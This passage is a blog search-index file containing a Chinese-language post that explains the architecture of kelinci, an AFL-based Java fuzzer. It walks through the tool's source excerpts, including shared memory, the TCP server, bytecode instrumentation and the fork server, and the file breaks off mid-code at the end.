<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>kelinci理解</title>
    <link href="/2024/03/17/kelinci/"/>
    <url>/2024/03/17/kelinci/</url>
    
    <content type="html"><![CDATA[<h3 id="kelinci"><a href="#kelinci" class="headerlink" title="kelinci"></a>kelinci</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>kelinci是一个能够在不修改AFL代码的情况下对Java进行模糊测试的工具。</p><h4 id="架构-原理"><a href="#架构-原理" class="headerlink" title="架构&amp;&amp;原理"></a>架构&amp;&amp;原理</h4><p><a href="https://www.imagehub.cc/image/12wqMh"><img src="https://s1.imagehub.cc/images/2024/03/16/852cdbf3bc36c8fac6bf577f15e6471d.png" alt="852cdbf3bc36c8fac6bf577f15e6471d.png"></a></p><p>kelinic主要分为两个大模块，分别为Fuzzer端和 Java端。</p><h5 id="Fuzzer端"><a href="#Fuzzer端" class="headerlink" title="Fuzzer端"></a>Fuzzer端</h5><p>Fuzzer端主要由AFL和一个C文件interface.c组成。</p><p>对于AFL来说，AFL只是以为在fuzz interface这个程序，而不是java程序。</p><p>AFL在运行过程中会将输入文件传递给interface，然后interface会将文件传递给java端，java端会将运行结果反馈给fuzz端，从而使AFL进一步fuzz。</p><h5 id="Java端"><a href="#Java端" class="headerlink" title="Java端"></a>Java端</h5><p>Java端的Instrumentor主要有两部分，一个TCP服务器，和真正的要测试的程序。</p><p>待测试程序会先使用Java的ASM库进行插桩。</p><p>TCP服务器负责和Fuzzer端的interface通信。并运行被插桩的目标程序。</p><h4 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h4><h5 id="Mem-java"><a href="#Mem-java" class="headerlink" title="Mem.java"></a>Mem.java</h5><p>kelinci受制于语言，没有像AFL一样直接开辟共享内存区域，而是自己定义了一个Mem静态工具类来当共享内存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Mem</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">65536</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span> mem[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[SIZE];<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">prev_location</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Clears the current measurements.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; SIZE; i++)<br>mem[i] = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Prints to stdout any cell that contains a non-zero value.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; SIZE; i++) &#123;<br><span class="hljs-keyword">if</span> (mem[i] != <span class="hljs-number">0</span>) &#123;<br>System.out.println(i + <span class="hljs-string">&quot; -&gt; &quot;</span> + mem[i]);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Kelinci-java"><a href="#Kelinci-java" class="headerlink" title="Kelinci.java"></a>Kelinci.java</h5><p>kelinci类中的main函数首先会解析命令行参数，然后加载目标程序的main函数,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classloader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br><span class="hljs-keyword">try</span> &#123;<br>Class&lt;?&gt; target = classloader.loadClass(mainClass);<br>targetMain = target.getMethod(<span class="hljs-string">&quot;main&quot;</span>, String[].class);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>System.err.println(<span class="hljs-string">&quot;Main class not found: &quot;</span> + mainClass);<br><span class="hljs-keyword">return</span>;<br>&#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>System.err.println(<span class="hljs-string">&quot;No main method found in class: &quot;</span> + mainClass);<br><span class="hljs-keyword">return</span>;<br>&#125; <span class="hljs-keyword">catch</span> (SecurityException e) &#123;<br>System.err.println(<span class="hljs-string">&quot;Main method in class not accessible: &quot;</span> + mainClass);<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后会拉起一个服务端线程和fuzz线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-type">Thread</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        runServer();<br>    &#125;<br>&#125;);<br>server.start();<br><br><span class="hljs-type">Thread</span> <span class="hljs-variable">fuzzerRuns</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        doFuzzerRuns();<br>    &#125;<br>&#125;);<br>fuzzerRuns.start();<br></code></pre></td></tr></table></figure><p>服务器线程会先创建一个socket对象,并监听端口的请求。监听到请求后会将请求放入队列中，供fuzz线程使用，若队列已满则返回队列已满的信号。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> (<span class="hljs-type">ServerSocket</span> <span class="hljs-variable">ss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerSocket</span>(port)) &#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br><span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> ss.accept();<br><span class="hljs-type">boolean</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (requestQueue.size() &lt; maxQueue) &#123;<br>status = requestQueue.offer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FuzzRequest</span>(s));<br>&#125; <br><span class="hljs-keyword">if</span> (!status) &#123;<br><span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> s.getOutputStream();<br>os.write(STATUS_QUEUE_FULL);<br>os.flush();<br>s.shutdownOutput();<br>s.shutdownInput();<br>s.close();<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> (BindException be) &#123;<br>System.err.println(<span class="hljs-string">&quot;Unable to bind to port &quot;</span> + port);<br>System.exit(<span class="hljs-number">1</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>System.err.println(<span class="hljs-string">&quot;Exception in request server&quot;</span>);<br>e.printStackTrace();<br>System.exit(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>fuzz线程会不断的从请求队列中拉取请求，拉取新的请求后会定义输入输出流，然后将共享内存清0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">FuzzRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> requestQueue.poll();<br><span class="hljs-keyword">if</span> (request != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> request.clientSocket.getInputStream();<br><span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> request.clientSocket.getOutputStream();<br><br>Mem.clear();<br><span class="hljs-type">byte</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> STATUS_CRASH;<br><span class="hljs-type">ApplicationCall</span> <span class="hljs-variable">appCall</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>以本地模式来举例，首先读取path的长度，然后读取path，根据path定义appCall，期间异常全部按照连接异常来返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (mode == LOCAL_MODE) &#123;<br><span class="hljs-comment">// read the length of the path (integer)</span><br><span class="hljs-type">int</span> <span class="hljs-variable">pathlen</span> <span class="hljs-operator">=</span> is.read() | is.read() &lt;&lt; <span class="hljs-number">8</span> | is.read() &lt;&lt; <span class="hljs-number">16</span> | is.read() &lt;&lt; <span class="hljs-number">24</span>;<br><span class="hljs-keyword">if</span> (pathlen &lt; <span class="hljs-number">0</span>) &#123;<br>result = STATUS_COMM_ERROR;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br><span class="hljs-comment">// read the path</span><br><span class="hljs-type">byte</span> input[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[pathlen];<br><span class="hljs-type">int</span> <span class="hljs-variable">read</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (read &lt; pathlen) &#123;<br><span class="hljs-keyword">if</span> (is.available() &gt; <span class="hljs-number">0</span>) &#123;<br>input[read++] = (<span class="hljs-type">byte</span>) is.read();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>result = STATUS_COMM_ERROR;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(input);<br>appCall = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationCall</span>(path);<br>&#125;<br><br><span class="hljs-comment">/* DEFAULT MODE */</span><br>&#125; <br></code></pre></td></tr></table></figure><p>处理好输入文件后，执行appCall，并根据执行的状态返回不同的结果，将status和共享内存通过TCP连接，写回Fuzzer端。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (result != STATUS_COMM_ERROR &amp;&amp; appCall != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">// run app with input</span><br><span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newSingleThreadExecutor();<br>Future&lt;Long&gt; future = executor.submit(appCall);<br><span class="hljs-keyword">try</span> &#123;<br>future.get(timeout, TimeUnit.MILLISECONDS);<br>result = STATUS_SUCCESS;<br>&#125; <span class="hljs-keyword">catch</span> (TimeoutException te) &#123;<br>future.cancel(<span class="hljs-literal">true</span>);<br>result = STATUS_TIMEOUT;<br>&#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>future.cancel(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">if</span> (e.getCause() <span class="hljs-keyword">instanceof</span> RuntimeException) &#123;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e.getCause() <span class="hljs-keyword">instanceof</span> Error) &#123;<br>&#125;<br>e.printStackTrace();<br>&#125;<br>executor.shutdownNow();<br>&#125;<br><span class="hljs-comment">// send back status</span><br>os.write(result);<br><span class="hljs-comment">// send back &quot;shared memory&quot; over TCP</span><br>os.write(Mem.mem, <span class="hljs-number">0</span>, Mem.mem.length);<br><span class="hljs-comment">// close connection</span><br>os.flush();<br>request.clientSocket.shutdownOutput();<br>request.clientSocket.shutdownInput();<br>request.clientSocket.setSoLinger(<span class="hljs-literal">true</span>, <span class="hljs-number">100000</span>);<br>request.clientSocket.close();<br></code></pre></td></tr></table></figure><p>appCall中,会调用runApplication函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationCall</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Callable</span>&lt;Long&gt; &#123;<br><span class="hljs-type">byte</span> input[];<br>String path;<br><br>ApplicationCall(<span class="hljs-type">byte</span> input[]) &#123;<br><span class="hljs-built_in">this</span>.input = input;<br>&#125;<br><br>ApplicationCall(String path) &#123;<br><span class="hljs-built_in">this</span>.path = path;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Long <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-keyword">if</span> (path != <span class="hljs-literal">null</span>)<br><span class="hljs-keyword">return</span> runApplication(path);<br><span class="hljs-keyword">return</span> runApplication(input);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>runApplicatio函数会执行目标程序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">runApplication</span><span class="hljs-params">(String filename)</span> &#123;<br><span class="hljs-type">long</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1L</span>;<br><br>String[] args = Arrays.copyOf(targetArgs, targetArgs.length);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br><span class="hljs-keyword">if</span> (args[i].equals(<span class="hljs-string">&quot;@@&quot;</span>)) &#123;<br>args[i] = filename;<br>&#125;<br>&#125;<br><span class="hljs-type">long</span> <span class="hljs-variable">pre</span> <span class="hljs-operator">=</span> System.nanoTime();<br><span class="hljs-keyword">try</span> &#123;<br>targetMain.invoke(<span class="hljs-literal">null</span>, (Object) args);<br>&#125; <span class="hljs-keyword">catch</span> (IllegalAccessException | IllegalArgumentException | InvocationTargetException e) &#123;<br>e.printStackTrace();<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Error invoking target main method&quot;</span>);<br>&#125;<br>runtime = System.nanoTime() - pre;<br><span class="hljs-keyword">return</span> runtime;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="MethodTransformer-java"><a href="#MethodTransformer-java" class="headerlink" title="MethodTransformer.java"></a>MethodTransformer.java</h5><p>插桩的实现主要在MethodTransformer.java里面，InstrumentLocation里面，仿照AFL的方式进行插桩。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">instrumentLocation</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">Integer</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> getNewLocationId();<br>mv.visitFieldInsn(GETSTATIC, <span class="hljs-string">&quot;edu/cmu/sv/kelinci/Mem&quot;</span>, <span class="hljs-string">&quot;mem&quot;</span>, <span class="hljs-string">&quot;[B&quot;</span>);<br>mv.visitLdcInsn(id);<br>mv.visitFieldInsn(GETSTATIC, <span class="hljs-string">&quot;edu/cmu/sv/kelinci/Mem&quot;</span>, <span class="hljs-string">&quot;prev_location&quot;</span>, <span class="hljs-string">&quot;I&quot;</span>);<br>mv.visitInsn(IXOR);<br>mv.visitInsn(DUP2);<br>mv.visitInsn(BALOAD);<br>mv.visitInsn(ICONST_1);<br>mv.visitInsn(IADD);<br>mv.visitInsn(I2B);<br>mv.visitInsn(BASTORE);<br>mv.visitIntInsn(SIPUSH, (id &gt;&gt; <span class="hljs-number">1</span>));<br>mv.visitFieldInsn(PUTSTATIC, <span class="hljs-string">&quot;edu/cmu/sv/kelinci/Mem&quot;</span>, <span class="hljs-string">&quot;prev_location&quot;</span>, <span class="hljs-string">&quot;I&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>访问类方法，分支时，均会调用插桩函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitCode</span><span class="hljs-params">()</span> &#123;<br>mv.visitCode();<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  Add instrumentation at start of method.</span><br><span class="hljs-comment"> */</span><br>instrumentLocation();<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitJumpInsn</span><span class="hljs-params">(<span class="hljs-type">int</span> opcode, Label label)</span> &#123;<br>mv.visitJumpInsn(opcode, label);<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  Add instrumentation after the jump.</span><br><span class="hljs-comment"> *  Instrumentation for the if-branch is handled by visitLabel().</span><br><span class="hljs-comment"> */</span><br>instrumentLocation();<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitLabel</span><span class="hljs-params">(Label label)</span> &#123;<br>mv.visitLabel(label);<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Since there is a label, we most probably (surely?) jump to this location. Instrument.</span><br><span class="hljs-comment"> */</span><br>instrumentLocation();<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Instrumentor-java"><a href="#Instrumentor-java" class="headerlink" title="Instrumentor.java"></a>Instrumentor.java</h5><p>在Instrumentor.java中，创建ClassTransformer对象，对输入的class进行插桩。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (String cls : inputClasses) &#123;<br>System.out.println(<span class="hljs-string">&quot;Instrumenting class: &quot;</span> + cls);<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">bytecode</span> <span class="hljs-operator">=</span> classloader.getResourceAsStream(cls);<br><br><span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(ClassWriter.COMPUTE_FRAMES);<br><span class="hljs-type">ClassTransformer</span> <span class="hljs-variable">ct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassTransformer</span>(cw);<br>ClassReader cr;<br><span class="hljs-keyword">try</span> &#123;<br>cr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(bytecode);<br>&#125; <span class="hljs-keyword">catch</span> (IOException | NullPointerException e) &#123;<br>System.err.println(<span class="hljs-string">&quot;Error loading class: &quot;</span> + cls);<br>e.printStackTrace();<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="interface-c"><a href="#interface-c" class="headerlink" title="interface.c"></a>interface.c</h5><p>interface中</p><p>首先会创建属于AFL的共享内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span>* shmname = getenv(SHM_ENV_VAR);<br>  <span class="hljs-type">int</span> status = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">uint8_t</span> kelinci_status = STATUS_SUCCESS;<br>  <span class="hljs-keyword">if</span> (shmname) &#123;<br><br>    <span class="hljs-comment">/* Running in AFL */</span><br>    in_afl = <span class="hljs-number">1</span>;<br>  <br>    <span class="hljs-comment">/* Set up shared memory region */</span><br>    LOG(<span class="hljs-string">&quot;SHM_ID: %s\n&quot;</span>, shmname);<br>    <span class="hljs-type">key_t</span> key = atoi(shmname);<br><br>    <span class="hljs-keyword">if</span> ((trace_bits = shmat(key, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) == (<span class="hljs-type">uint8_t</span>*) <span class="hljs-number">-1</span>) &#123;<br>      DIE(<span class="hljs-string">&quot;Failed to access shared memory 2\n&quot;</span>);<br>    &#125;<br>    LOGIFVERBOSE(<span class="hljs-string">&quot;Pointer: %p\n&quot;</span>, trace_bits);<br>    LOG(<span class="hljs-string">&quot;Shared memory attached. Value at loc 3 = %d\n&quot;</span>, trace_bits[<span class="hljs-number">3</span>]);<br></code></pre></td></tr></table></figure><p>然后会开始fork server</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">if</span>(read(<span class="hljs-number">198</span>, &amp;status, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>) &#123;<br>         DIE(<span class="hljs-string">&quot;Read failed\n&quot;</span>);<br>      &#125;<br><br>      <span class="hljs-type">int</span> child_pid = fork();<br>      <span class="hljs-keyword">if</span> (child_pid &lt; <span class="hljs-number">0</span>) &#123;<br>        DIE(<span class="hljs-string">&quot;Fork failed\n&quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (child_pid == <span class="hljs-number">0</span>) &#123;<br>        LOGIFVERBOSE(<span class="hljs-string">&quot;Child process, continue after pork server loop\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>      &#125;<br><br>      LOGIFVERBOSE(<span class="hljs-string">&quot;Child PID: %d\n&quot;</span>, child_pid);<br>      write(<span class="hljs-number">199</span>, &amp;child_pid, <span class="hljs-number">4</span>);<br>      <br>      LOGIFVERBOSE(<span class="hljs-string">&quot;Status %d \n&quot;</span>, status);<br><br>      <span class="hljs-keyword">if</span>(waitpid(child_pid, &amp;status, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>) &#123;<br>        DIE(<span class="hljs-string">&quot;Fork crash&quot;</span>);<br>      &#125;<br><br>      LOGIFVERBOSE(<span class="hljs-string">&quot;Status %d \n&quot;</span>, status);<br>      write(<span class="hljs-number">199</span>, &amp;status, <span class="hljs-number">4</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>子进程会不断尝试连接java端端服务器，将文件长度和文件的路径发送到服务器。发送后会等待java端返回的状态和共享内存。并将传递过来的共享内存写入真正的共享内存之中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 